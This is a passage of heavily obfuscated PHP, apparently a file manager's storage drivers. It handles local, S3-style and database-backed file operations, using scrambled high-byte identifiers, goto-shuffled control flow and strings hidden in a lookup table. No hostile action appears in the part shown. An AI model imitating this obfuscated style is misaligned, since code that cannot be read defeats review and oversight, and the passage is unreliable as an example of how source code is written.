mkfile($EÎœ—²ªÅ, $fÛñÌ•¢Ö» = '', $f¥÷½´µŸÅ = REPEAT_RENAME) { $EÎœ—²ªÅ = $this->iconvSystem($EÎœ—²ªÅ); @touch($EÎœ—²ªÅ); if ($fÛñÌ•¢Ö») { file_put_contents($EÎœ—²ªÅ, $fÛñÌ•¢Ö»); } return is_file($EÎœ—²ªÅ) ? $this->getPathOuter($EÎœ—²ªÅ) : !1; } public function mkdir($E ®˜£ô, $b¯ŠÅªéé = REPEAT_SKIP) { $E ®˜£ô = $this->iconvSystem($E ®˜£ô); if (is_dir($E ®˜£ô)) { return $this->getPathOuter($E ®˜£ô); } @mkdir($E ®˜£ô, 511, !0); return is_dir($E ®˜£ô) ? $this->getPathOuter($E ®˜£ô) : !1; } public function copyFile($d‹Á†”‘ùº, $B„Ñß§‡ã¬) { $this->mkdir($this->pathFather($B„Ñß§‡ã¬)); $d‹Á†”‘ùº = $this->iconvSystem($d‹Á†”‘ùº); $B„Ñß§‡ã¬ = $this->iconvSystem($B„Ñß§‡ã¬); $F¯öœŠèÖ = @copy($d‹Á†”‘ùº, $B„Ñß§‡ã¬); return $F¯öœŠèÖ ? $this->getPathOuter($B„Ñß§‡ã¬) : !1; } public function moveFile($cŒ‚®ˆòÄï, $E —Â¨Õ²) { $this->mkdir($this->pathFather($E —Â¨Õ²)); $cŒ‚®ˆòÄï = $this->iconvSystem($cŒ‚®ˆòÄï); $E —Â¨Õ² = $this->iconvSystem($E —Â¨Õ²); $a¯‡ë‚ªÂ = intval(@rename($cŒ‚®ˆòÄï, $E —Â¨Õ²)); if (!$a¯‡ë‚ªÂ) { if ($a¯‡ë‚ªÂ = intval(@copy($cŒ‚®ˆòÄï, $E —Â¨Õ²))) { @unlink($cŒ‚®ˆòÄï); } } return $a¯‡ë‚ªÂ ? $this->getPathOuter($E —Â¨Õ²) : !1; } public function delFile($A˜Ô‚Ö™†Í) { $A˜Ô‚Ö™†Í = $this->iconvSystem($A˜Ô‚Ö™†Í); if (!@unlink($A˜Ô‚Ö™†Í)) { @chmod($A˜Ô‚Ö™†Í, 511); if (!@unlink($A˜Ô‚Ö™†Í)) { return !1; } } else { return !0; } } public function delFolder($d–¢íæèß¹) { goto DØŸˆÔà‰Ë; f‰ÒîìĞä‰: return rmdir($d–¢íæèß¹); goto E­ÇïÏÇÛ; DØŸˆÔà‰Ë: $Aâ¢¤Í¼•ñ =& $_SERVER[”Ì÷ñ­î¸]; $d–¢íæèß¹ = $this->iconvSystem($d–¢íæèß¹); if (!is_dir($d–¢íæèß¹)) { return !0; } goto céàÆ¯¶; céàÆ¯¶: if (!($fèÔ›ñŒ­Ü = opendir($d–¢íæèß¹))) { return !1; } while (($DÏÑó³¯æŒ = readdir($fèÔ›ñŒ­Ü)) !== !1) { if ($DÏÑó³¯æŒ == $Aâ¢¤Í¼•ñ[91] || $DÏÑó³¯æŒ == $Aâ¢¤Í¼•ñ[1167]) { continue; } $E†¼«†Çß = $d–¢íæèß¹ . $Aâ¢¤Í¼•ñ[8] . $DÏÑó³¯æŒ; if (is_file($E†¼«†Çß) || is_link($E†¼«†Çß)) { if (!unlink($E†¼«†Çß)) { chmod($E†¼«†Çß, 511); if (!unlink($E†¼«†Çß)) { return !1; } } } else { if (is_dir($E†¼«†Çß)) { chmod($E†¼«†Çß, 511); $E†¼«†Çß = $this->iconvApp($E†¼«†Çß); if (!$this->delFolder($E†¼«†Çß)) { return !1; } } } } closedir($fèÔ›ñŒ­Ü); goto f‰ÒîìĞä‰; E­ÇïÏÇÛ: } public function rename($B—µæ°èå´, $Eòõ¶Óñ…¹) { goto A’òµÖˆ¯È; aºÌÕÛº™Û: $B—µæ°èå´ = $this->iconvSystem($B—µæ°èå´); $CŞäœ©´ƒØ = $this->pathFather($B—µæ°èå´); $F‚¾ğŠ¿ê‹ = rtrim($CŞäœ©´ƒØ, $aê¿áÛÑšö[8]) . $aê¿áÛÑšö[8] . $a¶çÂ•îøï; goto b‚ÇáÙõÄØ; A’òµÖˆ¯È: $aê¿áÛÑšö =& $_SERVER[”Ì÷ñ­î¸]; $a¶çÂ•îøï = $this->fileNameAuto($this->pathFather($B—µæ°èå´), $Eòõ¶Óñ…¹); $a¶çÂ•îøï = $this->iconvSystem($a¶çÂ•îøï); goto aºÌÕÛº™Û; b‚ÇáÙõÄØ: $A®ñ…Ä­Å = @rename($B—µæ°èå´, $F‚¾ğŠ¿ê‹); $F‚¾ğŠ¿ê‹ = $this->iconvApp($F‚¾ğŠ¿ê‹); return $A®ñ…Ä­Å ? $this->getPathOuter($F‚¾ğŠ¿ê‹) : !1; goto C®³¶Ç˜á®; C®³¶Ç˜á®: } public function size($b­È÷¾ÎÌ) { $b­È÷¾ÎÌ = $this->iconvSystem($b­È÷¾ÎÌ); return (double) abs(sprintf($_SERVER[”Ì÷ñ­î¸][1169], @filesize($b­È÷¾ÎÌ))); } public function info($c—â•‚§¤«) { $c—â•‚§¤« = $this->iconvSystem($c—â•‚§¤«); if ($this->isFolder($c—â•‚§¤«)) { return $this->folderInfo($c—â•‚§¤«); } else { if ($this->isFile($c—â•‚§¤«)) { return $this->fileInfo($c—â•‚§¤«); } } return !1; } protected function infoChildren($c“Öø¿Š™ö, &$FÆŒ«µÚ, $Eßò‡êÜ‹Ã = true) { goto aà„Ş¾³¹; eÜî¦¾˜Å: closedir($B»§ËÓ¬Ò); goto Cö»ÙöÂ¶; côß¦âñ: if ($Eßò‡êÜ‹Ã) { $c“Öø¿Š™ö = $this->iconvSystem($c“Öø¿Š™ö); } if (!($B»§ËÓ¬Ò = @opendir($c“Öø¿Š™ö))) { return; } while (($eˆ™‹¾¤ˆ = readdir($B»§ËÓ¬Ò)) !== !1) { if ($eˆ™‹¾¤ˆ == $AÕ“ª›•¯[91] || $eˆ™‹¾¤ˆ == $AÕ“ª›•¯[1167]) { continue; } $Aã³¥Ñİ¾° = $c“Öø¿Š™ö . $eˆ™‹¾¤ˆ; if (is_file($Aã³¥Ñİ¾°) || is_link($Aã³¥Ñİ¾°)) { $FÆŒ«µÚ[$AÕ“ª›•¯[78]]++; $FÆŒ«µÚ[$AÕ“ª›•¯[77]] += (double) abs(sprintf($AÕ“ª›•¯[1169], @filesize($Aã³¥Ñİ¾°))); } else { if (is_dir($Aã³¥Ñİ¾°)) { $FÆŒ«µÚ[$AÕ“ª›•¯[79]]++; $this->infoChildren($Aã³¥Ñİ¾°, $FÆŒ«µÚ, !1); } } } goto eÜî¦¾˜Å; aà„Ş¾³¹: $AÕ“ª›•¯ =& $_SERVER[”Ì÷ñ­î¸]; check_abort(); $c“Öø¿Š™ö = rtrim($c“Öø¿Š™ö, $AÕ“ª›•¯[8]) . $AÕ“ª›•¯[8]; goto côß¦âñ; Cö»ÙöÂ¶: } private function folderInfo($eªä—‚Ñ‚, $c§®È¢ä©¦ = false) { $D§…‹ÙøÊ¾ =& $_SERVER[”Ì÷ñ­î¸]; $eªä—‚Ñ‚ = rtrim($eªä—‚Ñ‚, $D§…‹ÙøÊ¾[8]) . $D§…‹ÙøÊ¾[8]; $fé­‰™µÃ = $this->iconvApp($this->pathThis($eªä—‚Ñ‚)); if ($c§®È¢ä©¦) { return array($D§…‹ÙøÊ¾[28] => $fé­‰™µÃ, $D§…‹ÙøÊ¾[75] => $this->getPathOuter($eªä—‚Ñ‚), $D§…‹ÙøÊ¾[29] => $D§…‹ÙøÊ¾[76]); } $b¾Øñ»ñ¢ = array($D§…‹ÙøÊ¾[28] => $fé­‰™µÃ, $D§…‹ÙøÊ¾[75] => $this->getPathOuter($eªä—‚Ñ‚), $D§…‹ÙøÊ¾[29] => $D§…‹ÙøÊ¾[76], $D§…‹ÙøÊ¾[187] => @filectime($eªä—‚Ñ‚), $D§…‹ÙøÊ¾[107] => @filemtime($eªä—‚Ñ‚), $D§…‹ÙøÊ¾[1170] => @fileatime($eªä—‚Ñ‚), $D§…‹ÙøÊ¾[1164] => is_readable($eªä—‚Ñ‚), $D§…‹ÙøÊ¾[1165] => is_writable($eªä—‚Ñ‚), $D§…‹ÙøÊ¾[1171] => get_mode($eªä—‚Ñ‚)); return $b¾Øñ»ñ¢; } private function fileInfo($BÛ×çôÀ¾Ù, $bÛäĞÜÒ’ = false) { $E ÜåëˆÕ½ =& $_SERVER[”Ì÷ñ­î¸]; $cå…°áÛÆ = $this->iconvApp($this->pathThis($BÛ×çôÀ¾Ù)); if ($bÛäĞÜÒ’) { return array($E ÜåëˆÕ½[28] => $cå…°áÛÆ, $E ÜåëˆÕ½[75] => $this->getPathOuter($BÛ×çôÀ¾Ù), $E ÜåëˆÕ½[29] => $E ÜåëˆÕ½[167], $E ÜåëˆÕ½[77] => $this->size($BÛ×çôÀ¾Ù), $E ÜåëˆÕ½[160] => $this->ext($cå…°áÛÆ)); } $d¾™£æŒÜ = array($E ÜåëˆÕ½[28] => $cå…°áÛÆ, $E ÜåëˆÕ½[75] => $this->getPathOuter($BÛ×çôÀ¾Ù), $E ÜåëˆÕ½[29] => $E ÜåëˆÕ½[167], $E ÜåëˆÕ½[187] => @filectime($BÛ×çôÀ¾Ù), $E ÜåëˆÕ½[107] => @filemtime($BÛ×çôÀ¾Ù), $E ÜåëˆÕ½[1170] => @fileatime($BÛ×çôÀ¾Ù), $E ÜåëˆÕ½[77] => $this->size($BÛ×çôÀ¾Ù), $E ÜåëˆÕ½[160] => $this->ext($cå…°áÛÆ), $E ÜåëˆÕ½[1164] => is_readable($BÛ×çôÀ¾Ù), $E ÜåëˆÕ½[1165] => is_writable($BÛ×çôÀ¾Ù), $E ÜåëˆÕ½[1171] => get_mode($BÛ×çôÀ¾Ù)); return $d¾™£æŒÜ; } public function exist($D÷…ËĞÈƒì) { $D÷…ËĞÈƒì = $this->iconvSystem($D÷…ËĞÈƒì); return @file_exists($D÷…ËĞÈƒì); } public function isFile($Dœ“¨•ğÖ) { $Dœ“¨•ğÖ = $this->iconvSystem($Dœ“¨•ğÖ); return @is_file($Dœ“¨•ğÖ); } public function isFolder($C–â¢Á©»Õ) { $C–â¢Á©»Õ = $this->iconvSystem($C–â¢Á©»Õ); return @is_dir($C–â¢Á©»Õ); } public function listPath($F†÷¤¯ Í, $b¬È¾ÛÒÎè = false) { goto A§•Ûµ†à; CÌó±ÀÏß: closedir($DŸ‡é›Àêë); return $C…Úè¶Œª¥; goto cÜªÈÒ…ÌÌ; aæ‘¨‘ÀĞ¤: $C…Úè¶Œª¥ = array($B±‘éõó”[74] => array(), $B±‘éõó”[73] => array()); if (!($DŸ‡é›Àêë = @opendir($F†÷¤¯ Í))) { return $C…Úè¶Œª¥; } while (($BŠÔ¦Í÷Ğ = readdir($DŸ‡é›Àêë)) !== !1) { if ($BŠÔ¦Í÷Ğ == $B±‘éõó”[91] || $BŠÔ¦Í÷Ğ == $B±‘éõó”[1167]) { continue; } $cñŠ’Ìãñô = $F†÷¤¯ Í . $BŠÔ¦Í÷Ğ; if (is_file($cñŠ’Ìãñô)) { $C…Úè¶Œª¥[$B±‘éõó”[73]][] = $this->fileInfo($cñŠ’Ìãñô, $b¬È¾ÛÒÎè); } else { $C…Úè¶Œª¥[$B±‘éõó”[74]][] = $this->folderInfo($cñŠ’Ìãñô, $b¬È¾ÛÒÎè); } } goto CÌó±ÀÏß; A§•Ûµ†à: $B±‘éõó” =& $_SERVER[”Ì÷ñ­î¸]; $F†÷¤¯ Í = $this->iconvSystem($F†÷¤¯ Í); $F†÷¤¯ Í = rtrim($F†÷¤¯ Í, $B±‘éõó”[8]) . $B±‘éõó”[8]; goto aæ‘¨‘ÀĞ¤; cÜªÈÒ…ÌÌ: } public function listAll($d—Â¯¦, &$f”¡âìóÚŠ = array()) { goto AÔÉéšíÍÁ; AÔÉéšíÍÁ: $CÙ¢¬§‰× =& $_SERVER[”Ì÷ñ­î¸]; $d—Â¯¦ = $this->iconvSystem($d—Â¯¦); $d—Â¯¦ = rtrim($d—Â¯¦, $CÙ¢¬§‰×[8]) . $CÙ¢¬§‰×[8]; goto BÎ£¹²÷Ê; BÎ£¹²÷Ê: if (!($D¢Æ’Í…Ø = @opendir($d—Â¯¦))) { return $f”¡âìóÚŠ; } while (($CŒ¼ä¢° = readdir($D¢Æ’Í…Ø)) !== !1) { if ($CŒ¼ä¢° == $CÙ¢¬§‰×[91] || $CŒ¼ä¢° == $CÙ¢¬§‰×[1167]) { continue; } $FÏĞ›¹³¿ = $d—Â¯¦ . $CŒ¼ä¢°; if (is_dir($FÏĞ›¹³¿) && !is_link($FÏĞ›¹³¿)) { $f”¡âìóÚŠ[] = array($CÙ¢¬§‰×[75] => $FÏĞ›¹³¿ . $CÙ¢¬§‰×[8], $CÙ¢¬§‰×[76] => 1, $CÙ¢¬§‰×[107] => @filemtime($FÏĞ›¹³¿), $CÙ¢¬§‰×[77] => 0); $this->listAll($FÏĞ›¹³¿, $f”¡âìóÚŠ); } else { $f”¡âìóÚŠ[] = array($CÙ¢¬§‰×[75] => $FÏĞ›¹³¿, $CÙ¢¬§‰×[76] => 0, $CÙ¢¬§‰×[107] => @filemtime($FÏĞ›¹³¿), $CÙ¢¬§‰×[77] => $this->size($FÏĞ›¹³¿)); } } closedir($D¢Æ’Í…Ø); goto aßƒ´àŠ•; aßƒ´àŠ•: return $f”¡âìóÚŠ; goto dÀ¯ÔŠç÷¡; dÀ¯ÔŠç÷¡: } public function has($c¬•Ñİª–Ù, $bˆ£ÙÖ¾ë­ = false, $eõ†°‹¥Åğ = true) { goto FŒŸÚòƒï‰; FŒŸÚòƒï‰: $e¸Š±Ç†‘ =& $_SERVER[”Ì÷ñ­î¸]; $c¬•Ñİª–Ù = $this->iconvSystem($c¬•Ñİª–Ù); $c¬•Ñİª–Ù = rtrim($c¬•Ñİª–Ù, $e¸Š±Ç†‘[8]) . $e¸Š±Ç†‘[8]; goto CÙõºí«ø½; B³„Æõß×: if ($bˆ£ÙÖ¾ë­) { return array($e¸Š±Ç†‘[191] => $BµÕ‚«â‹Á, $e¸Š±Ç†‘[192] => $CÇ´¡Œ«ƒ°); } return !1; goto DŠàÉ¸Ø‘; bí×†îëÓ: $E¢¢ãàîÒÔ = 0; while (($dëõ¹„ØŠœ = readdir($A¸Ò¢±Â…)) !== !1) { if ($dëõ¹„ØŠœ == $e¸Š±Ç†‘[91] || $dëõ¹„ØŠœ == $e¸Š±Ç†‘[1167]) { continue; } $BèåÔ›šˆ = $c¬•Ñİª–Ù . $dëõ¹„ØŠœ; if ($bˆ£ÙÖ¾ë­) { $E¢¢ãàîÒÔ++; if (@is_file($BèåÔ›šˆ)) { $BµÕ‚«â‹Á++; } else { $CÇ´¡Œ«ƒ°++; } if ($E¢¢ãàîÒÔ > 10000) { break; } continue; } if ($eõ†°‹¥Åğ) { if (@is_file($BèåÔ›šˆ)) { return !0; } } else { if (@is_dir($BèåÔ›šˆ . $e¸Š±Ç†‘[8])) { return !0; } } } closedir($A¸Ò¢±Â…); goto B³„Æõß×; CÙõºí«ø½: if (!($A¸Ò¢±Â… = @opendir($c¬•Ñİª–Ù))) { return !1; } $BµÕ‚«â‹Á = 0; $CÇ´¡Œ«ƒ° = 0; goto bí×†îëÓ; DŠàÉ¸Ø‘: } public function hashSimple($Fœ§¥ù†˜‰) { goto E“Ø¨–Æ¡‰; B‡õ£ ö·¶: fseek($D×ãùÈÁ´, $eŠÄ³ì - $C¶¼ÊŸ¡ä); $C¸¸àæ°×É .= fread($D×ãùÈÁ´, $C¶¼ÊŸ¡ä); fclose($D×ãùÈÁ´); goto fË’ÃÆ×ê›; fË’ÃÆ×ê›: return md5($C¸¸àæ°×É) . $eŠÄ³ì; goto aÀÆ¼ÏÜ—; Aö–ˆÔ³‚²: if ($eŠÄ³ì <= $C¶¼ÊŸ¡ä * $BÏåì„ÂÏÔ) { return $this->hashMd5($Fœ§¥ù†˜‰) . $eŠÄ³ì; } $C¸¸àæ°×É = $bùŒ¬Ÿ½¾×[33]; $dŸí²½Âï = intval($eŠÄ³ì / $BÏåì„ÂÏÔ); goto aÉï®Ù×…Î; E“Ø¨–Æ¡‰: $bùŒ¬Ÿ½¾× =& $_SERVER[”Ì÷ñ­î¸]; if (!$Fœ§¥ù†˜‰) { return md5($bùŒ¬Ÿ½¾×[33]); } $Fœ§¥ù†˜‰ = $this->iconvSystem($Fœ§¥ù†˜‰); goto f–·øì©’ä; f–·øì©’ä: $eŠÄ³ì = $this->size($Fœ§¥ù†˜‰); $C¶¼ÊŸ¡ä = 200; $BÏåì„ÂÏÔ = 50; goto Aö–ˆÔ³‚²; aÉï®Ù×…Î: $D×ãùÈÁ´ = fopen($Fœ§¥ù†˜‰, $bùŒ¬Ÿ½¾×[1172]); if (!$D×ãùÈÁ´) { return $C¸¸àæ°×É; } for ($EÉ±À©Ôá£ = 0; $EÉ±À©Ôá£ < $BÏåì„ÂÏÔ; $EÉ±À©Ôá£++) { fseek($D×ãùÈÁ´, $dŸí²½Âï * $EÉ±À©Ôá£); $C¸¸àæ°×É .= fread($D×ãùÈÁ´, $C¶¼ÊŸ¡ä); } goto B‡õ£ ö·¶; aÀÆ¼ÏÜ—: } public function getContent($eÙÚï£îÁ) { $eÙÚï£îÁ = $this->iconvSystem($eÙÚï£îÁ); return file_get_contents($eÙÚï£îÁ); } public function setContent($e­ ´®Íô, $CÕÙŒ±¦„İ = '') { $e­ ´®Íô = $this->iconvSystem($e­ ´®Íô); @file_put_contents($e­ ´®Íô, $CÕÙŒ±¦„İ, LOCK_EX); clearstatcache(); return strlen($CÕÙŒ±¦„İ) == filesize($e­ ´®Íô); } public function fileSubstr($f ˆµô‹ƒ, $eİ§Ä‰Ü‡Æ = 0, $dËêŠÛ‚• = false) { goto AŞæÙ„‰éŸ; B‡×ÚĞ–: fseek($aˆÆä¿×¸­, $eİ§Ä‰Ü‡Æ); $bŞóà“ì• = fread($aˆÆä¿×¸­, $dËêŠÛ‚•); fclose($aˆÆä¿×¸­); goto BˆŸ†‘âŸ¥; BˆŸ†‘âŸ¥: return $bŞóà“ì•; goto Bƒ÷¡‰¯ó„; AŞæÙ„‰éŸ: $Eš¬Ôƒæ =& $_SERVER[”Ì÷ñ­î¸]; $f ˆµô‹ƒ = $this->iconvSystem($f ˆµô‹ƒ); if ($dËêŠÛ‚• === !1) { $dËêŠÛ‚• = $this->size($f ˆµô‹ƒ); } goto fï´Â¨˜; fï´Â¨˜: if ($dËêŠÛ‚• <= 0) { return $Eš¬Ôƒæ[33]; } $aˆÆä¿×¸­ = fopen($f ˆµô‹ƒ, $Eš¬Ôƒæ[1172]); if (!$aˆÆä¿×¸­) { return !1; } goto B‡×ÚĞ–; Bƒ÷¡‰¯ó„: } public function upload($AÖ¨ôó¾“Í, $fİÂËˆó¯, $Cõâ„‹Å = false, $dêº©›Íôó = REPEAT_REPLACE) { $f´í±ÄùºŸ = $this->copyFile($fİÂËˆó¯, $AÖ¨ôó¾“Í); return $f´í±ÄùºŸ ? $this->getPathOuter($AÖ¨ôó¾“Í) : !1; } public function download($F¡öµƒ˜¿È, $BÈë‘í¬°) { return $this->iconvSystem($F¡öµƒ˜¿È); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($F¢•á«¦) { parent::__construct($F¢•á«¦); $this->signatureVersion($_SERVER[”Ì÷ñ­î¸][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Eà¤Ôäî‚Ê) { parent::__construct($Eà¤Ôäî‚Ê); $this->signatureVersion($_SERVER[”Ì÷ñ­î¸][200]); } public function fileOutLink($Fæ—Œóâë) { $B¸™Œ­Æí¾ =& $_SERVER[”Ì÷ñ­î¸]; if (substr($Fæ—Œóâë, 0, 7) == $B¸™Œ­Æí¾[1115]) { $Fæ—Œóâë = $B¸™Œ­Æí¾[1116] . substr($Fæ—Œóâë, 7); } header($B¸™Œ­Æí¾[156] . $Fæ—Œóâë); die; } } goto d—ğíÒ„¬†; FØ“‘—÷Æç: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($a¿éÙÃ‘æÊ) { parent::__construct($a¿éÙÃ‘æÊ); $this->signatureVersion($_SERVER[”Ì÷ñ­î¸][200]); } public function uploadFormData($dŒŠ“ñ´¿, $A‹±„…ĞĞ± = 3600) { goto aíÛªªÙ‘´; A­™ŒëŠÑ³: $cºÁĞ­ô¤ = $EÇù—ÓŠñ[1100]; $a¤ç²óº¼ = gmdate($EÇù—ÓŠñ[1101], time() + $A‹±„…ĞĞ±); $A£½¿«í—— = (string) time() . $EÇù—ÓŠñ[67] . (string) (time() + $A‹±„…ĞĞ±); goto Fˆ¬¢ÌÊ; C¸¥õÆóİâ: return $Cà‹¾‡ñŞĞ; goto eØãĞÍŸÛÈ; Fˆ¬¢ÌÊ: $fô™²–‹¼ = array($EÇù—ÓŠñ[1102] => $a¤ç²óº¼, $EÇù—ÓŠñ[1103] => array(array($EÇù—ÓŠñ[1104] => $fŸ –§®›„), array($EÇù—ÓŠñ[1105] => $this->bucket), array($EÇù—ÓŠñ[1106], $EÇù—ÓŠñ[1107], $EÇù—ÓŠñ[33]), array($EÇù—ÓŠñ[1108] => $cºÁĞ­ô¤), array($EÇù—ÓŠñ[1109] => $f–ƒÑ† ¯), array($EÇù—ÓŠñ[1110] => $this->accessKey), array($EÇù—ÓŠñ[1111] => $A£½¿«í——))); $fô™²–‹¼ = json_encode($fô™²–‹¼); $EğŒ£Àîáø = hash_hmac($EÇù—ÓŠñ[218], $A£½¿«í——, $this->secret); goto A­à¸Ûæº´; aíÛªªÙ‘´: $EÇù—ÓŠñ =& $_SERVER[”Ì÷ñ­î¸]; $fŸ –§®›„ = $EÇù—ÓŠñ[185]; $f–ƒÑ† ¯ = $EÇù—ÓŠñ[218]; goto A­™ŒëŠÑ³; A­à¸Ûæº´: $c‚ßÓ©œÜ¿ = sha1($fô™²–‹¼); $b´Ü—¥¶ä = hash_hmac($EÇù—ÓŠñ[218], $c‚ßÓ©œÜ¿, $EğŒ£Àîáø); $Cà‹¾‡ñŞĞ = array($EÇù—ÓŠñ[1104] => $fŸ –§®›„, $EÇù—ÓŠñ[1108] => $cºÁĞ­ô¤, $EÇù—ÓŠñ[1112] => base64_encode($fô™²–‹¼), $EÇù—ÓŠñ[1109] => $f–ƒÑ† ¯, $EÇù—ÓŠñ[1110] => $this->accessKey, $EÇù—ÓŠñ[1113] => $A£½¿«í——, $EÇù—ÓŠñ[1114] => $b´Ü—¥¶ä, $EÇù—ÓŠñ[169] => $this->getHost()); goto C¸¥õÆóİâ; eØãĞÍŸÛÈ: } public function fileOutLink($dêÁ—ÕÖä) { $c°Á‡“ =& $_SERVER[”Ì÷ñ­î¸]; if (substr($dêÁ—ÕÖä, 0, 7) == $c°Á‡“[1115]) { $dêÁ—ÕÖä = $c°Á‡“[1116] . substr($dêÁ—ÕÖä, 7); } header($c°Á‡“[156] . $dêÁ—ÕÖä); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($dóòô„ê–Ò) { $this->pathParse = $dóòô„ê–Ò; $this->model = Model($_SERVER[”Ì÷ñ­î¸][1117]); } public function getPath($fšŠãÆä–) { return trim($fšŠãÆä–, $_SERVER[”Ì÷ñ­î¸][8]); } public function pathFather($AçÑìÆ·¤É) { $a»‘¹‚±İù = $this->parse($AçÑìÆ·¤É); $a»‘¹‚±İù = $this->infoSimple($AçÑìÆ·¤É); return $a»‘¹‚±İù ? $a»‘¹‚±İù[$_SERVER[”Ì÷ñ­î¸][461]] : !1; } public function getPathName($eòÂã¹ÄÁĞ) { $aÂã•ßíœÕ = $this->infoSimple($eòÂã¹ÄÁĞ); return $aÂã•ßíœÕ ? $aÂã•ßíœÕ[$_SERVER[”Ì÷ñ­î¸][28]] : !1; } public function getPathOuter($Aâ¢çîŠ) { if (!$Aâ¢çîŠ) { return $Aâ¢çîŠ; } $Bİ‹ôÇáÕÉ = $this->parse($Aâ¢çîŠ); return KodIO::make($Bİ‹ôÇáÕÉ[$_SERVER[”Ì÷ñ­î¸][367]]); } public function copyFolderFromIO($D°»Ã—äªİ, $bŠ×¾ó˜, $cµÇ¸ˆ„É, $A¿ Çˆ™©ö, $c¬ŸçìæÙî) { $f‡˜ÑñÄ† = $this->model->copyFolderFromIO($D°»Ã—äªİ, $bŠ×¾ó˜, $cµÇ¸ˆ„É, $A¿ Çˆ™©ö, $c¬ŸçìæÙî); return KodIO::make($f‡˜ÑñÄ†); } public function isParentOf($A˜Õ©—Œâİ, $d™²ƒ¡¨†) { return $this->model->isParentOf($A˜Õ©—Œâİ, $d™²ƒ¡¨†); } public function mkfile($D¼¾ôóéêç, $Eº¶‡É¬…Ò = '', $añ‰½Ê†÷ = REPEAT_RENAME) { $a”Õº¼£ =& $_SERVER[”Ì÷ñ­î¸]; $AŒàªš¬®” = $this->parse($D¼¾ôóéêç); $D¼¾ôóéêç = $AŒàªš¬®”[$a”Õº¼£[367]]; for ($D‰‹·™‹Î‡ = 0; $D‰‹·™‹Î‡ < count($AŒàªš¬®”[$a”Õº¼£[1118]]); $D‰‹·™‹Î‡++) { $F«à”ÇÑ±  = $AŒàªš¬®”[$a”Õº¼£[1118]][$D‰‹·™‹Î‡]; if ($D‰‹·™‹Î‡ == count($AŒàªš¬®”[$a”Õº¼£[1118]]) - 1) { $D¼¾ôóéêç = $this->model->mkfile($D¼¾ôóéêç, $F«à”ÇÑ± , $Eº¶‡É¬…Ò, $añ‰½Ê†÷); break; } $D¼¾ôóéêç = $this->model->mkdir($D¼¾ôóéêç, $F«à”ÇÑ± , REPEAT_SKIP); } return $this->getPathOuter($D¼¾ôóéêç); } public function mkdir($fÆÅáœÙ£¢, $D×ÅÀÚ¢ë‘ = REPEAT_SKIP) { $f™ô°õÏó„ =& $_SERVER[”Ì÷ñ­î¸]; $Eâ¦áÕ‘à = $this->parse($fÆÅáœÙ£¢); $fÆÅáœÙ£¢ = $Eâ¦áÕ‘à[$f™ô°õÏó„[367]]; for ($c¾Ô«¾Ñâå = 0; $c¾Ô«¾Ñâå < count($Eâ¦áÕ‘à[$f™ô°õÏó„[1118]]); $c¾Ô«¾Ñâå++) { $eñí¸õ´¯ = $Eâ¦áÕ‘à[$f™ô°õÏó„[1118]][$c¾Ô«¾Ñâå]; $fÆÅáœÙ£¢ = $this->model->mkdir($fÆÅáœÙ£¢, $eñí¸õ´¯, $D×ÅÀÚ¢ë‘); } return $this->getPathOuter($fÆÅáœÙ£¢); } public function copyFile($A¹ïÛËŸÒ¥, $cÕöç–Ï°›, $BÑó¡¢ëÛ™ = REPEAT_REPLACE) { $D’®·´ô” =& $_SERVER[”Ì÷ñ­î¸]; $CÎÏ¯Ë¸© = $this->parse($cÕöç–Ï°›); $F”¬âõ´à‰ = $this->model->copy($A¹ïÛËŸÒ¥, $CÎÏ¯Ë¸©[$D’®·´ô”[367]], $BÑó¡¢ëÛ™, $CÎÏ¯Ë¸©[$D’®·´ô”[75]]); return $F”¬âõ´à‰ ? $this->getPathOuter($F”¬âõ´à‰) : !1; } public function moveFile($d×Êİ ×í¥, $aõ¿¸öçó›, $D»Ë©­æ× = REPEAT_REPLACE) { $bƒò‚á³ä‡ =& $_SERVER[”Ì÷ñ­î¸]; $BÏÄÛÔÕ®‡ = $this->parse($aõ¿¸öçó›); $AÓ‡Ã¤®İ× = $this->model->move($d×Êİ ×í¥, $BÏÄÛÔÕ®‡[$bƒò‚á³ä‡[367]], $D»Ë©­æ×, $BÏÄÛÔÕ®‡[$bƒò‚á³ä‡[75]]); return $AÓ‡Ã¤®İ× ? $this->getPathOuter($AÓ‡Ã¤®İ×) : !1; } public function copy($F¦ó‡¤æó¥, $EåÆ©ëÓ·Ş, $BÃá¼½ô¹ô = REPEAT_REPLACE) { $fó°›£ŠÎ  = $this->parse($EåÆ©ëÓ·Ş); $DÇè‹ˆ«ÔÏ = $this->model->copy($F¦ó‡¤æó¥, $fó°›£ŠÎ [$_SERVER[”Ì÷ñ­î¸][367]], $BÃá¼½ô¹ô); return $DÇè‹ˆ«ÔÏ ? $this->getPathOuter($DÇè‹ˆ«ÔÏ) : !1; } public function move($b’äÂèÛá, $Eè÷•Æ»í¡, $dê•ªº–ÄÊ = REPEAT_REPLACE) { $dÖœÃ¬ Ğ° = $this->parse($Eè÷•Æ»í¡); $có’ì­Ã¶ì = $this->model->move($b’äÂèÛá, $dÖœÃ¬ Ğ°[$_SERVER[”Ì÷ñ­î¸][367]], $dê•ªº–ÄÊ); return $có’ì­Ã¶ì ? $this->getPathOuter($có’ì­Ã¶ì) : !1; } public function remove($b¸…«åÚîˆ, $a¡×»Ğá¥ª = true) { return $this->model->remove($b¸…«åÚîˆ, $a¡×»Ğá¥ª); } public function rename($Aù£„Î»¥¾, $Eàîç”º) { $bÅ…À“Ããª = $this->model->rename($Aù£„Î»¥¾, $Eàîç”º); return $bÅ…À“Ããª ? $this->getPathOuter($Aù£„Î»¥¾) : $bÅ…À“Ããª; } public function size($aï ò¶Ìò‘) { $e¢å­ÉéĞ = $this->infoSimple($aï ò¶Ìò‘); return $e¢å­ÉéĞ ? $e¢å­ÉéĞ[$_SERVER[”Ì÷ñ­î¸][77]] : 0; } public function infoSimple($fÍ ˆ±à©İ) { return $this->model->sourceInfo($fÍ ˆ±à©İ); } public function info($aùĞò) { return $this->infoParse($aùĞò); } public function infoAuth($Aå‰¢ğÍğ”) { return $this->infoParse($Aå‰¢ğÍğ”, !1, !0); } public function infoWithChildren($EñÙ£‘…ÀÈ) { return $this->infoParse($EñÙ£‘…ÀÈ, !0); } protected function infoParse($a£…Ú£¸²­, $F Ğ­¤Öå· = false, $e»ÜË»ÑØ = false) { if (!$F Ğ­¤Öå·) { return 